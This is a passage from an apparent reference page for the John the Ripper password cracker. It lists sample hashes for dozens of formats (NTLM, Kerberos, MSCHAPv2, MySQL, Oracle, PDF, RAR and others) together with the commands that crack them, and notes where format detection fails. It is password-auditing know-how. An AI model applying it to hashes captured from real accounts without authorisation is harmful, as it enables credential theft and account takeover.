username:$krb5$oskov$ACM.UIUC.EDU$4730d7249765615d6f3652321c4fb76d09fb9cd06faeb0c31b8737f9fdfcde4bd4259c31cb1dff25df39173b09abdff08373302d99ac09802a290915243d9f0ea0313fdedc7f8d1fae0d9df8f0ee6233818d317f03a72c2e77b480b2bc50d1ca14fba85133ea00e472c50dbc825291e2853bd60a969ddb69dae35b604b34ea2c2265a4ffc72e9fb811da17c7f2887ccb17e2f87cd1f6c28a9afc0c083a9356a9ee2a28d2e4a01fc7ea90cc8836b8e25650c3a1409b811d0bad42a59aa418143291d42d7b1e6cb5b1876a4cc758d721323a762e943f774630385c9faa68df6f3a94422f97:::::::
$ john hashes.txt
$ john --format=krb5 hashes.txt</pre>
<h2>lm &#8211; LM DES</h2>
<h3>Supported Hash Formats</h3>
<pre>$ cat hashes.txt
$LM$a9c604d244c4e99d
$ john hashes.txt
$ john --format=lm hashes.txt</pre>
<pre>$ cat hashes.txt
username:$LM$a9c604d244c4e99d
$ john hashes.txt
$ john --format=lm hashes.txt</pre>
<pre>$ cat hashes.txt
username:$LM$a9c604d244c4e99d:::::::
$ john hashes.txt
$ john --format=lm hashes.txt</pre>
<h2>lotus5 &#8211; Lotus5</h2>
<h3>Supported Hash Formats</h3>
<pre>$ cat hashes.txt
355E98E7C7B59BD810ED845AD0FD2FC4
$ john hashes.txt # Doesn't work.  JTR detects hash as "LM DES".
$ john --format=lotus5 hashes.txt</pre>
<pre>$ cat hashes.txt
username:355E98E7C7B59BD810ED845AD0FD2FC4
$ john hashes.txt # Doesn't work.  JTR detects hash as "LM DES".
$ john --format=lotus5 hashes.txt</pre>
<pre>$ cat hashes.txt
username:355E98E7C7B59BD810ED845AD0FD2FC4:::::::
$ john hashes.txt # Doesn't work.  JTR detects hash as "LM DES".
$ john --format=lotus5 hashes.txt</pre>
<h2>md4-gen &#8211; Generic salted MD4</h2>
<h3>Supported Hash Formats</h3>
<pre>$ cat hashes.txt
$MD4p$salt$15ad2b7a23e5088942f9d3772181b384
$ john hashes.txt
$ john --format=md4-gen hashes.txt</pre>
<pre>$ cat hashes.txt
username:$MD4p$salt$15ad2b7a23e5088942f9d3772181b384
$ john hashes.txt
$ john --format=md4-gen hashes.txt</pre>
<pre>$ cat hashes.txt
username:$MD4p$salt$15ad2b7a23e5088942f9d3772181b384:::::::
$ john hashes.txt
$ john --format=md4-gen hashes.txt</pre>
<h2>md5 &#8211; FreeBSD MD5</h2>
<h3>Supported Hash Formats</h3>
<pre>$ cat hashes.txt
$1$12345678$aIccj83HRDBo6ux1bVx7D1
$ john hashes.txt
$ john --format=md5 hashes.txt</pre>
<pre>$ cat hashes.txt
username:$1$12345678$aIccj83HRDBo6ux1bVx7D1
$ john hashes.txt
$ john --format=md5 hashes.txt</pre>
<pre>$ cat hashes.txt
username:$1$12345678$aIccj83HRDBo6ux1bVx7D1:::::::
$ john hashes.txt
$ john --format=md5 hashes.txt</pre>
<pre>$ cat hashes.txt
$apr1$Q6ZYh...$RV6ft2bZ8j.NGrxLYaJt9.
$ john hashes.txt
$ john --format=md5 hashes.txt</pre>
<pre>$ cat hashes.txt
username:$apr1$Q6ZYh...$RV6ft2bZ8j.NGrxLYaJt9.
$ john hashes.txt
$ john --format=md5 hashes.txt</pre>
<pre>$ cat hashes.txt
username:$apr1$Q6ZYh...$RV6ft2bZ8j.NGrxLYaJt9.:::::::
$ john hashes.txt
$ john --format=md5 hashes.txt</pre>
<h2>md5-gen &#8211; Generic MD5</h2>
<h3>Supported Hash Formats</h3>
<p>TODO: No working example yet.</p>
<h2>mediawiki &#8211; MediaWiki MD5s</h2>
<h3>Supported Hash Formats</h3>
<pre>$ cat hashes.txt
$B$113$de2874e33da25313d808d2a8cbf31485
$ john hashes.txt
$ john --format=mediawiki hashes.txt</pre>
<pre>$ cat hashes.txt
username:$B$113$de2874e33da25313d808d2a8cbf31485
$ john hashes.txt
$ john --format=mediawiki hashes.txt</pre>
<pre>$ cat hashes.txt
username:$B$113$de2874e33da25313d808d2a8cbf31485:::::::
$ john hashes.txt
$ john --format=mediawiki hashes.txt</pre>
<h2>mscash &#8211; M$ Cache Hash</h2>
<h3>Supported Hash Formats</h3>
<pre>$ cat hashes.txt
M$test1#64cd29e36a8431a2b111378564a10631
$ john hashes.txt # Doesn't work.  JTR detects hash as "HMAC MD5".
$ john --format=mscash hashes.txt</pre>
<pre>$ cat hashes.txt
username:M$test1#64cd29e36a8431a2b111378564a10631
$ john hashes.txt # Doesn't work.  JTR detects hash as "HMAC MD5".
$ john --format=mscash hashes.txt</pre>
<pre>$ cat hashes.txt
username:M$test1#64cd29e36a8431a2b111378564a10631:::::::
$ john hashes.txt # Doesn't work.  JTR detects hash as "HMAC MD5".
$ john --format=mscash hashes.txt</pre>
<h2>mscash2 &#8211; M$ Cache Hash 2 (DCC2)</h2>
<h3>Supported Hash Formats</h3>
<pre>$ cat hashes.txt
$DCC2$10240#test1#607bbe89611e37446e736f7856515bf8
$ john hashes.txt # Doesn't work.  JTR detects hash as "M$ Cache Hash".
$ john --format=mscash2 hashes.txt</pre>
<pre>$ cat hashes.txt
username:$DCC2$10240#test1#607bbe89611e37446e736f7856515bf8
$ john hashes.txt
$ john --format=mscash2 hashes.txt</pre>
<pre>$ cat hashes.txt
username:$DCC2$10240#test1#607bbe89611e37446e736f7856515bf8:::::::
$ john hashes.txt
$ john --format=mscash2 hashes.txt</pre>
<h2>mschapv2 &#8211; MSCHAPv2 C/R MD4 DES</h2>
<h3>Supported Hash Formats</h3>
<pre>$ cat hashes.txt
$MSCHAPv2$d94e7c7972b2376b28c268583e162de7$eba25a3b04d2c7085d01f842e2befc91745c40db0f792356$0677ca7318fd7f65ae1b4f58c9f4f400$lameuser
$ john hashes.txt
$ john --format=mschapv2 hashes.txt</pre>
<pre>$ cat hashes.txt
username:$MSCHAPv2$d94e7c7972b2376b28c268583e162de7$eba25a3b04d2c7085d01f842e2befc91745c40db0f792356$0677ca7318fd7f65ae1b4f58c9f4f400$lameuser
$ john hashes.txt
$ john --format=mschapv2 hashes.txt</pre>
<pre>$ cat hashes.txt
username:$MSCHAPv2$d94e7c7972b2376b28c268583e162de7$eba25a3b04d2c7085d01f842e2befc91745c40db0f792356$0677ca7318fd7f65ae1b4f58c9f4f400$lameuser:::::::
$ john hashes.txt
$ john --format=mschapv2 hashes.txt</pre>
<h2>mskrb5 &#8211; MS Kerberos 5 AS-REQ Pre-Auth</h2>
<h3>Supported Hash Formats</h3>
<pre>$ cat hashes.txt
$mskrb5$$$98cd00b6f222d1d34e08fe0823196e0b$5937503ec29e3ce4e94a051632d0fff7b6781f93e3decf7dca707340239300d602932154
$ john hashes.txt
$ john --format=mskrb5 hashes.txt</pre>
<pre>$ cat hashes.txt
username:$mskrb5$$$98cd00b6f222d1d34e08fe0823196e0b$5937503ec29e3ce4e94a051632d0fff7b6781f93e3decf7dca707340239300d602932154
$ john hashes.txt
$ john --format=mskrb5 hashes.txt</pre>
<pre>$ cat hashes.txt
username:$mskrb5$$$98cd00b6f222d1d34e08fe0823196e0b$5937503ec29e3ce4e94a051632d0fff7b6781f93e3decf7dca707340239300d602932154:::::::
$ john hashes.txt
$ john --format=mskrb5 hashes.txt</pre>
<h2>mssql05 &#8211; MS-SQL05</h2>
<h3>Supported Hash Formats</h3>
<pre>$ cat hashes.txt
0x01004086CEB6BF932BC4151A1AF1F13CD17301D70816A8886908
$ john hashes.txt
$ john --format=mssql05 hashes.txt</pre>
<pre>$ cat hashes.txt
username:0x01004086CEB6BF932BC4151A1AF1F13CD17301D70816A8886908
$ john hashes.txt
$ john --format=mssql05 hashes.txt</pre>
<pre>$ cat hashes.txt
username:0x01004086CEB6BF932BC4151A1AF1F13CD17301D70816A8886908:::::::
$ john hashes.txt
$ john --format=mssql05 hashes.txt</pre>
<h2>mssql &#8211; MS-SQL</h2>
<h3>Supported Hash Formats</h3>
<pre>$ cat hashes.txt
0x0100A607BA7C54A24D17B565C59F1743776A10250F581D482DA8B6D6261460D3F53B279CC6913CE747006A2E3254
$ john hashes.txt
$ john --format=mssql hashes.txt</pre>
<pre>$ cat hashes.txt
username:0x0100A607BA7C54A24D17B565C59F1743776A10250F581D482DA8B6D6261460D3F53B279CC6913CE747006A2E3254
$ john hashes.txt
$ john --format=mssql hashes.txt</pre>
<pre>$ cat hashes.txt
username:0x0100A607BA7C54A24D17B565C59F1743776A10250F581D482DA8B6D6261460D3F53B279CC6913CE747006A2E3254:::::::
$ john hashes.txt
$ john --format=mssql hashes.txt</pre>
<h2>mysql-fast &#8211; MYSQL_fast</h2>
<h3>Supported Hash Formats</h3>
<pre>$ cat hashes.txt
60671c896665c3fa
$ john hashes.txt
$ john --format=mysql-fast hashes.txt</pre>
<pre>$ cat hashes.txt
username:60671c896665c3fa
$ john hashes.txt
$ john --format=mysql-fast hashes.txt</pre>
<pre>$ cat hashes.txt
username:60671c896665c3fa:::::::
$ john hashes.txt
$ john --format=mysql-fast hashes.txt</pre>
<h2>mysql &#8211; MYSQL</h2>
<h3>Supported Hash Formats</h3>
<pre>$ cat hashes.txt
5d2e19393cc5ef67
$ john hashes.txt # Doesn't work.  JTR detects hash as "MYSQL_fast".
$ john --format=mysql hashes.txt</pre>
<pre>$ cat hashes.txt
username:5d2e19393cc5ef67
$ john hashes.txt # Doesn't work.  JTR detects hash as "MYSQL_fast".
$ john --format=mysql hashes.txt</pre>
<pre>$ cat hashes.txt
username:5d2e19393cc5ef67:::::::
$ john hashes.txt # Doesn't work.  JTR detects hash as "MYSQL_fast".
$ john --format=mysql hashes.txt</pre>
<h2>mysql-sha1 &#8211; MySQL 4.1 double-SHA-1</h2>
<h3>Supported Hash Formats</h3>
<pre>$ cat hashes.txt
*2470C0C06DEE42FD1618BB99005ADCA2EC9D1E19
$ john hashes.txt
$ john --format=mysql-sha1 hashes.txt</pre>
<pre>$ cat hashes.txt
username:*2470C0C06DEE42FD1618BB99005ADCA2EC9D1E19
$ john hashes.txt
$ john --format=mysql-sha1 hashes.txt</pre>
<pre>$ cat hashes.txt
username:*2470C0C06DEE42FD1618BB99005ADCA2EC9D1E19:::::::
$ john hashes.txt
$ john --format=mysql-sha1 hashes.txt</pre>
<h2>netlm &#8211; LM C/R DES</h2>
<h3>Supported Hash Formats</h3>
<pre>$ cat hashes.txt
$NETLM$1122334455667788$0836F085B124F33895875FB1951905DD2F85252CC731BB25
$ john hashes.txt
$ john --format=netlm hashes.txt</pre>
<pre>$ cat hashes.txt
username:$NETLM$1122334455667788$0836F085B124F33895875FB1951905DD2F85252CC731BB25
$ john hashes.txt
$ john --format=netlm hashes.txt</pre>
<pre>$ cat hashes.txt
username:$NETLM$1122334455667788$0836F085B124F33895875FB1951905DD2F85252CC731BB25:::::::
$ john hashes.txt
$ john --format=netlm hashes.txt</pre>
<h2>netlmv2 &#8211; LMv2 C/R MD4 HMAC-MD5</h2>
<h3>Supported Hash Formats</h3>
<pre>$ cat hashes.txt
$NETLMv2$USER1$1122334455667788$B1D163EA5881504F3963DC50FCDC26C1$EB4D9E8138149E20
$ john hashes.txt
$ john --format=netlmv2 hashes.txt</pre>
<pre>$ cat hashes.txt
username:$NETLMv2$USER1$1122334455667788$B1D163EA5881504F3963DC50FCDC26C1$EB4D9E8138149E20
$ john hashes.txt
$ john --format=netlmv2 hashes.txt</pre>
<pre>$ cat hashes.txt
username:$NETLMv2$USER1$1122334455667788$B1D163EA5881504F3963DC50FCDC26C1$EB4D9E8138149E20:::::::
$ john hashes.txt
$ john --format=netlmv2 hashes.txt</pre>
<h2>netntlm &#8211; NTLMv1 C/R MD4 DES [ESS MD5]</h2>
<h3>Supported Hash Formats</h3>
<pre>$ cat hashes.txt
$NETNTLM$1122334455667788$B2B2220790F40C88BCFF347C652F67A7C4A70D3BEBD70233
$ john hashes.txt
$ john --format=netntlm hashes.txt</pre>
<pre>$ cat hashes.txt
username:$NETNTLM$1122334455667788$B2B2220790F40C88BCFF347C652F67A7C4A70D3BEBD70233
$ john hashes.txt
$ john --format=netntlm hashes.txt</pre>
<pre>$ cat hashes.txt
username:$NETNTLM$1122334455667788$B2B2220790F40C88BCFF347C652F67A7C4A70D3BEBD70233:::::::
$ john hashes.txt
$ john --format=netntlm hashes.txt</pre>
<h2>netntlmv2 &#8211; NTLMv2 C/R MD4 HMAC-MD5</h2>
<h3>Supported Hash Formats</h3>
<pre>$ cat hashes.txt
$NETNTLMv2$NTLMV2TESTWORKGROUP$1122334455667788$07659A550D5E9D02996DFD95C87EC1D5$0101000000000000006CF6385B74CA01B3610B02D99732DD000000000200120057004F0052004B00470052004F00550050000100200044004100540041002E00420049004E0043002D0053004500430055005200490000000000
$ john hashes.txt
$ john --format=netntlmv2 hashes.txt</pre>
<pre>$ cat hashes.txt
username:$NETNTLMv2$NTLMV2TESTWORKGROUP$1122334455667788$07659A550D5E9D02996DFD95C87EC1D5$0101000000000000006CF6385B74CA01B3610B02D99732DD000000000200120057004F0052004B00470052004F00550050000100200044004100540041002E00420049004E0043002D0053004500430055005200490000000000
$ john hashes.txt
$ john --format=netntlmv2 hashes.txt</pre>
<pre>$ cat hashes.txt
username:$NETNTLMv2$NTLMV2TESTWORKGROUP$1122334455667788$07659A550D5E9D02996DFD95C87EC1D5$0101000000000000006CF6385B74CA01B3610B02D99732DD000000000200120057004F0052004B00470052004F00550050000100200044004100540041002E00420049004E0043002D0053004500430055005200490000000000:::::::
$ john hashes.txt
$ john --format=netntlmv2 hashes.txt</pre>
<h2>nethalflm &#8211; HalfLM C/R DES</h2>
<h3>Supported Hash Formats</h3>
<pre>$ cat hashes.txt
$NETHALFLM$1122334455667788$6E1EC36D3417CE9E09A4424309F116C4C991948DAEB4ADAD
$ john hashes.txt
$ john --format=nethalflm hashes.txt</pre>
<pre>$ cat hashes.txt
username:$NETHALFLM$1122334455667788$6E1EC36D3417CE9E09A4424309F116C4C991948DAEB4ADAD
$ john hashes.txt
$ john --format=nethalflm hashes.txt</pre>
<pre>$ cat hashes.txt
username:$NETHALFLM$1122334455667788$6E1EC36D3417CE9E09A4424309F116C4C991948DAEB4ADAD:::::::
$ john hashes.txt
$ john --format=nethalflm hashes.txt</pre>
<h2>md5ns &#8211; Netscreen MD5</h2>
<h3>Supported Hash Formats</h3>
<pre>$ cat hashes.txt
admin$nMjFM0rdC9iOc+xIFsGEm3LtAeGZhn
$ john hashes.txt
$ john --format=md5ns hashes.txt</pre>
<pre>$ cat hashes.txt
username:admin$nMjFM0rdC9iOc+xIFsGEm3LtAeGZhn
$ john hashes.txt
$ john --format=md5ns hashes.txt</pre>
<pre>$ cat hashes.txt
username:admin$nMjFM0rdC9iOc+xIFsGEm3LtAeGZhn:::::::
$ john hashes.txt
$ john --format=md5ns hashes.txt</pre>
<h2>nsldap &#8211; Netscape LDAP SHA</h2>
<h3>Supported Hash Formats</h3>
<pre>$ cat hashes.txt
{SHA}cMiB1KJphN3OeV9vcYF8nPRIDnk=
$ john hashes.txt
$ john --format=nsldap hashes.txt</pre>
<pre>$ cat hashes.txt
username:{SHA}cMiB1KJphN3OeV9vcYF8nPRIDnk=
$ john hashes.txt
$ john --format=nsldap hashes.txt</pre>
<pre>$ cat hashes.txt
username:{SHA}cMiB1KJphN3OeV9vcYF8nPRIDnk=:::::::
$ john hashes.txt
$ john --format=nsldap hashes.txt</pre>
<h2>ssha &#8211; Netscape LDAP SSHA</h2>
<h3>Supported Hash Formats</h3>
<pre>$ cat hashes.txt
{SSHA}WTT3B9Jjr8gOt0Q7WMs9/XvukyhTQj0Ns0jMKQ==
$ john hashes.txt
$ john --format=ssha hashes.txt</pre>
<pre>$ cat hashes.txt
username:{SSHA}WTT3B9Jjr8gOt0Q7WMs9/XvukyhTQj0Ns0jMKQ==
$ john hashes.txt
$ john --format=ssha hashes.txt</pre>
<pre>$ cat hashes.txt
username:{SSHA}WTT3B9Jjr8gOt0Q7WMs9/XvukyhTQj0Ns0jMKQ==:::::::
$ john hashes.txt
$ john --format=ssha hashes.txt</pre>
<h2>nt &#8211; NT MD4</h2>
<h3>Supported Hash Formats</h3>
<pre>$ cat hashes.txt
$NT$8846f7eaee8fb117ad06bdd830b7586c
$ john hashes.txt
$ john --format=nt hashes.txt</pre>
<pre>$ cat hashes.txt
username:$NT$8846f7eaee8fb117ad06bdd830b7586c
$ john hashes.txt
$ john --format=nt hashes.txt</pre>
<pre>$ cat hashes.txt
username:$NT$8846f7eaee8fb117ad06bdd830b7586c:::::::
$ john hashes.txt
$ john --format=nt hashes.txt</pre>
<h2>openssha &#8211; OpenLDAP SSHA</h2>
<h3>Supported Hash Formats</h3>
<pre>$ cat hashes.txt
{SSHA}hHSEPW3qeiOo5Pl2MpHQCXh0vgfyVR/X
$ john hashes.txt
$ john --format=openssha hashes.txt</pre>
<pre>$ cat hashes.txt
username:{SSHA}hHSEPW3qeiOo5Pl2MpHQCXh0vgfyVR/X
$ john hashes.txt
$ john --format=openssha hashes.txt</pre>
<pre>$ cat hashes.txt
username:{SSHA}hHSEPW3qeiOo5Pl2MpHQCXh0vgfyVR/X:::::::
$ john hashes.txt
$ john --format=openssha hashes.txt</pre>
<h2>oracle11 &#8211; Oracle 11g</h2>
<h3>Supported Hash Formats</h3>
<pre>$ cat hashes.txt
5FDAB69F543563582BA57894FE1C1361FB8ED57B903603F2C52ED1B4D642
$ john hashes.txt
$ john --format=oracle11 hashes.txt</pre>
<pre>$ cat hashes.txt
username:5FDAB69F543563582BA57894FE1C1361FB8ED57B903603F2C52ED1B4D642
$ john hashes.txt
$ john --format=oracle11 hashes.txt</pre>
<pre>$ cat hashes.txt
username:5FDAB69F543563582BA57894FE1C1361FB8ED57B903603F2C52ED1B4D642:::::::
$ john hashes.txt
$ john --format=oracle11 hashes.txt</pre>
<h2>oracle &#8211; Oracle</h2>
<h3>Supported Hash Formats</h3>
<pre>$ cat hashes.txt
O$SIMON#4F8BC1809CB2AF77
$ john hashes.txt
$ john --format=oracle hashes.txt</pre>
<pre>$ cat hashes.txt
username:O$SIMON#4F8BC1809CB2AF77
$ john hashes.txt
$ john --format=oracle hashes.txt</pre>
<pre>$ cat hashes.txt
username:O$SIMON#4F8BC1809CB2AF77:::::::
$ john hashes.txt
$ john --format=oracle hashes.txt</pre>
<h2>pdf &#8211; pdf</h2>
<h3>Supported Hash Formats</h3>
<pre>$ cat hashes.txt
$pdf$Standard*badad1e86442699427116d3e5d5271bc80a27814fc5e80f815efeef839354c5f*289ece9b5ce451a5d7064693dab3badf101112131415161718191a1b1c1d1e1f*16*34b1b6e593787af681a9b63fa8bf563b*1*1*0*1*4*128*-4*3*2
$ john hashes.txt
$ john --format=pdf hashes.txt</pre>
<pre>$ cat hashes.txt
username:$pdf$Standard*badad1e86442699427116d3e5d5271bc80a27814fc5e80f815efeef839354c5f*289ece9b5ce451a5d7064693dab3badf101112131415161718191a1b1c1d1e1f*16*34b1b6e593787af681a9b63fa8bf563b*1*1*0*1*4*128*-4*3*2
$ john hashes.txt
$ john --format=pdf hashes.txt</pre>
<pre>$ cat hashes.txt
username:$pdf$Standard*badad1e86442699427116d3e5d5271bc80a27814fc5e80f815efeef839354c5f*289ece9b5ce451a5d7064693dab3badf101112131415161718191a1b1c1d1e1f*16*34b1b6e593787af681a9b63fa8bf563b*1*1*0*1*4*128*-4*3*2:::::::
$ john hashes.txt
$ john --format=pdf hashes.txt</pre>
<h2>phpass-md5 &#8211; PHPass MD5</h2>
<h3>Supported Hash Formats</h3>
<pre>$ cat hashes.txt
$H$9aaaaaSXBjgypwqm.JsMssPLiS8YQ00
$ john hashes.txt
$ john --format=phpass-md5 hashes.txt</pre>
<pre>$ cat hashes.txt
username:$H$9aaaaaSXBjgypwqm.JsMssPLiS8YQ00
$ john hashes.txt
$ john --format=phpass-md5 hashes.txt</pre>
<pre>$ cat hashes.txt
username:$H$9aaaaaSXBjgypwqm.JsMssPLiS8YQ00:::::::
$ john hashes.txt
$ john --format=phpass-md5 hashes.txt</pre>
<h2>phps &#8211; PHPS MD5</h2>
<h3>Supported Hash Formats</h3>
<pre>$ cat hashes.txt
$PHPS$433925$5d756853cd63acee76e6dcd6d3728447
$ john hashes.txt
$ john --format=phps hashes.txt</pre>
<pre>$ cat hashes.txt
username:$PHPS$433925$5d756853cd63acee76e6dcd6d3728447
$ john hashes.txt
$ john --format=phps hashes.txt</pre>
<pre>$ cat hashes.txt
username:$PHPS$433925$5d756853cd63acee76e6dcd6d3728447:::::::
$ john hashes.txt
$ john --format=phps hashes.txt</pre>
<h2>pix-md5 &#8211; PIX MD5</h2>
<h3>Supported Hash Formats</h3>
<pre>$ cat hashes.txt
NuLKvvWGg.x9HEKO
$ john hashes.txt
$ john --format=pix-md5 hashes.txt</pre>
<pre>$ cat hashes.txt
username:NuLKvvWGg.x9HEKO
$ john hashes.txt
$ john --format=pix-md5 hashes.txt</pre>
<pre>$ cat hashes.txt
username:NuLKvvWGg.x9HEKO:::::::
$ john hashes.txt
$ john --format=pix-md5 hashes.txt</pre>
<h2>po &#8211; Post.Office MD5</h2>
<h3>Supported Hash Formats</h3>
<pre>$ cat hashes.txt
0c78bdef7d5448105cfbbc9aaa490a44550c41c11bab48f9dbd8203ed313eef0
$ john hashes.txt
$ john --format=po hashes.txt</pre>
<pre>$ cat hashes.txt
username:0c78bdef7d5448105cfbbc9aaa490a44550c41c11bab48f9dbd8203ed313eef0
$ john hashes.txt
$ john --format=po hashes.txt</pre>
<pre>$ cat hashes.txt
username:0c78bdef7d5448105cfbbc9aaa490a44550c41c11bab48f9dbd8203ed313eef0:::::::
$ john hashes.txt
$ john --format=po hashes.txt</pre>
<h2>rar &#8211; rar</h2>
<h3>Supported Hash Formats</h3>
<pre>$ cat hashes.txt
$rar3$*0*c9dea41b149b53b4*fcbdb66122d8ebdb32532c22ca7ab9ec*24
$ john hashes.txt
$ john --format=rar hashes.txt</pre>
<pre>$ cat hashes.txt
username:$rar3$*0*c9dea41b149b53b4*fcbdb66122d8ebdb32532c22ca7ab9ec*24
$ john hashes.txt
$ john --format=rar hashes.txt</pre>
<pre>$ cat hashes.txt
username:$rar3$*0*c9dea41b149b53b4*fcbdb66122d8ebdb32532c22ca7ab9ec*24:::::::
$ john hashes.txt
$ john --format=rar hashes.txt</pre>
<h2>raw-md4 &#8211; Raw MD4</h2>
<h3>Supported Hash Formats</h3>
<pre>$ cat hashes.txt
8a9d093f14f8701df17732b2bb182c74
$ john hashes.txt # Doesn't work.  JTR detects hash as "LM DES".
$ john --format=raw-md4 hashes.txt</pre>
<pre>$ cat hashes.txt
username:8a9d093f14f8701df17732b2bb182c74
$ john hashes.txt # Doesn't work.  JTR detects hash as "LM DES".
$ john --format=raw-md4 hashes.txt</pre>
<pre>$ cat hashes.txt
username:8a9d093f14f8701df17732b2bb182c74:::::::
$ john hashes.txt # Doesn't work.  JTR detects hash as "LM DES".
$ john --format=raw-md4 hashes.txt</pre>
<h2>raw-md5 &#8211; Raw MD5</h2>
<h3>Supported Hash Formats</h3>
<pre>$ cat hashes.txt
5a105e8b9d40e1329780d62ea2265d8a
$ john hashes.txt # Doesn't work.  JTR detects hash as "LM DES".
$ john --format=raw-md5 hashes.txt</pre>
<pre>$ cat hashes.txt
username:5a105e8b9d40e1329780d62ea2265d8a
$ john hashes.txt # Doesn't work.  JTR detects hash as "LM DES".
$ john --format=raw-md5 hashes.txt</pre>
<pre>$ cat hashes.txt
username:5a105e8b9d40e1329780d62ea2265d8a:::::::
$ john hashes.txt # Doesn't work.  JTR detects hash as "LM DES".
$ john --format=raw-md5 hashes.txt</pre>
<h2>raw-md5-unicode &#8211; Raw MD5 of Unicode plaintext</h2>
<h3>Supported Hash Formats</h3>
<pre>$ cat hashes.txt
16c47151c18ac087cd12b3a70746c790
$ john hashes.txt # Doesn't work.  JTR detects hash as "LM DES".
$ john --format=raw-md5-unicode hashes.txt</pre>
<pre>$ cat hashes.txt
username:16c47151c18ac087cd12b3a70746c790
$ john hashes.txt # Doesn't work.  JTR detects hash as "LM DES".
$ john --format=raw-md5-unicode hashes.txt</pre>
<pre>$ cat hashes.txt
username:16c47151c18ac087cd12b3a70746c790:::::::
$ john hashes.txt # Doesn't work.  JTR detects hash as "LM DES".
$ john --format=raw-md5-unicode hashes.txt</pre>
<h2>raw-sha1 &#8211; Raw SHA-1</h2>
<h3>Supported Hash Formats</h3>
<pre>$ cat hashes.txt
A9993E364706816ABA3E25717850C26C9CD0D89D
$ john hashes.txt
$ john --format=raw-sha1 hashes.txt</pre>
<pre>$ cat hashes.txt
username:A9993E364706816ABA3E25717850C26C9CD0D89D
$ john hashes.txt
$ john --format=raw-sha1 hashes.txt</pre>
<pre>$ cat hashes.txt
username:A9993E364706816ABA3E25717850C26C9CD0D89D:::::::
$ john hashes.txt
$ john --format=raw-sha1 hashes.txt</pre>
<h2>raw-sha224 &#8211; Raw SHA-224</h2>
<h3>Supported Hash Formats</h3>
<pre>$ cat hashes.txt
d63dc919e201d7bc4c825630d2cf25fdc93d4b2f0d46706d29038d01
$ john hashes.txt
$ john --format=raw-sha224 hashes.txt</pre>
<pre>$ cat hashes.txt
username:d63dc919e201d7bc4c825630d2cf25fdc93d4b2f0d46706d29038d01
$ john hashes.txt
$ john --format=raw-sha224 hashes.txt</pre>
<pre>$ cat hashes.txt
username:d63dc919e201d7bc4c825630d2cf25fdc93d4b2f0d46706d29038d01:::::::
$ john hashes.txt
$ john --format=raw-sha224 hashes.txt</pre>
<h2>raw-sha256 &#8211; Raw SHA-256</h2>
<h3>Supported Hash Formats</h3>
<pre>$ cat hashes.txt
5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8
$ john hashes.txt # Doesn't work.  JTR detects hash as "Post.Office MD5".
$ john --format=raw-sha256 hashes.txt</pre>
<pre>$ cat hashes.txt
username:5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8
$ john hashes.txt # Doesn't work.  JTR detects hash as "Post.Office MD5".
$ john --format=raw-sha256 hashes.txt</pre>
<pre>$ cat hashes.txt
username:5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8:::::::
$ john hashes.txt # Doesn't work.  JTR detects hash as "Post.Office MD5".
$ john --format=raw-sha256 hashes.txt</pre>
<h2>raw-sha384 &#8211; Raw SHA-384</h2>
<h3>Supported Hash Formats</h3>
<pre>$ cat hashes.txt
a8b64babd0aca91a59bdbb7761b421d4f2bb38280d3a75ba0f21f2bebc45583d446c598660c94ce680c47d19c30783a7
$ john hashes.txt
$ john --format=raw-sha384 hashes.txt</pre>
<pre>$ cat hashes.txt
username:a8b64babd0aca91a59bdbb7761b421d4f2bb38280d3a75ba0f21f2bebc45583d446c598660c94ce680c47d19c30783a7
$ john hashes.txt
$ john --format=raw-sha384 hashes.txt</pre>
<pre>$ cat hashes.txt
username:a8b64babd0aca91a59bdbb7761b421d4f2bb38280d3a75ba0f21f2bebc45583d446c598660c94ce680c47d19c30783a7:::::::
$ john hashes.txt
$ john --format=raw-sha384 hashes.txt</pre>
<h2>raw-sha512 &#8211; Raw SHA-512</h2>
<h3>Supported Hash Formats</h3>
<pre>$ cat hashes.txt
b109f3bbbc244eb82441917ed06d618b9008dd09b3befd1b5e07394c706a8bb980b1d7785e5976ec049b46df5f1326af5a2ea6d103fd07c95385ffab0cacbc86
$ john hashes.txt
$ john --format=raw-sha512 hashes.txt</pre>
<pre>$ cat hashes.txt
username:b109f3bbbc244eb82441917ed06d618b9008dd09b3befd1b5e07394c706a8bb980b1d7785e5976ec049b46df5f1326af5a2ea6d103fd07c95385ffab0cacbc86
$ john hashes.txt
$ john --format=raw-sha512 hashes.txt</pre>
<pre>$ cat hashes.txt
username:b109f3bbbc244eb82441917ed06d618b9008dd09b3befd1b5e07394c706a8bb980b1d7785e5976ec049b46df5f1326af5a2ea6d103fd07c95385ffab0cacbc86:::::::
$ john hashes.txt
$ john --format=raw-sha512 hashes.txt</pre>
<pre>$ cat hashes.txt
$SHA512$fa585d89c851dd338a70dcf535aa2a92fee7836dd6aff1226583e88e0996293f16bc009c652826e0fc5c706695a03cddce372f139eff4d13959da6f1f5d3eabe
$ john hashes.txt
$ john --format=raw-sha512 hashes.txt</pre>
<pre>$ cat hashes.txt
username:$SHA512$fa585d89c851dd338a70dcf535aa2a92fee7836dd6aff1226583e88e0996293f16bc009c652826e0fc5c706695a03cddce372f139eff4d13959da6f1f5d3eabe
$ john hashes.txt
$ john --format=raw-sha512 hashes.txt</pre>
<pre>$ cat hashes.txt
username:$SHA512$fa585d89c851dd338a70dcf535aa2a92fee7836dd6aff1226583e88e0996293f16bc009c652826e0fc5c706695a03cddce372f139eff4d13959da6f1f5d3eabe:::::::
$ john hashes.txt
$ john --format=raw-sha512 hashes.txt</pre>
<h2>salted-sha &#8211; Salted SHA</h2>
<h3>Supported Hash Formats</h3>
<pre>$ cat hashes.txt
{SSHA}hHSEPW3qeiOo5Pl2MpHQCXh0vgfyVR/X
$ john hashes.txt # Doesn't work.  JTR detects hash as "OpenLDAP SSHA".
$ john --format=salted-sha hashes.txt</pre>
<pre>$ cat hashes.txt
username:{SSHA}hHSEPW3qeiOo5Pl2MpHQCXh0vgfyVR/X
$ john hashes.txt # Doesn't work.  JTR detects hash as "OpenLDAP SSHA".
$ john --format=salted-sha hashes.txt</pre>
<pre>$ cat hashes.txt
username:{SSHA}hHSEPW3qeiOo5Pl2MpHQCXh0vgfyVR/X:::::::
$ john hashes.txt # Doesn't work.  JTR detects hash as "OpenLDAP SSHA".
$ john --format=salted-sha hashes.txt</pre>
<h2>sapb &#8211; SAP BCODE</h2>
<h3>Supported Hash Formats</h3>
<pre>$ cat hashes.txt
ROOT                                    $8366A4E9E6B72CB0
$ john hashes.txt
